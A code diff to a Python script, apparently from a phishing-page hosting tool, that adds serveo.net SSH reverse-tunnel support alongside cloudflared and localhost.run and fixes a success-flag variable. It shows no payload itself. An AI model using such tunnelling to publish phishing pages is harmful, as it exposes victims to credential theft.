@@ -317,9 +317,11 @@ ts_commands = {
     "cloudflared": f"{cf_command} tunnel -url {local_url}",
     "localxpose": f"{lx_command} tunnel http -t {local_url}",
     "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "serveo": f"ssh -R 80:{local_url} serveo.net -T -n",
     "cf": f"{cf_command} tunnel -url {local_url}",
     "loclx": f"{lx_command} tunnel http -t {local_url}",
-    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "svo": f"ssh -R 80:{local_url} serveo.net -T -n"
 }
 
 # My utility functions
@@ -1361,7 +1363,7 @@ def server():
         sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
         sleep(2)
     sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
-    for logfile in [php_file, cf_file, lx_file, lhr_file]:
+    for logfile in [php_file, cf_file, lx_file, lhr_file, svo_file]:
         delete(logfile)
         if not isfile(logfile):
             try:
@@ -1416,13 +1418,14 @@ def server():
             lx_success = True
             break
         sleep(1)
-    svo_success = False
+    lhr_success = False
     for i in range(10):
         lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
         sleep(1)
+    svo_success = False
     for i in range(10):
         svo_url = grep("(https://[-0-9a-z.]*.serveo.net)", svo_file)
         if svo_url != "":
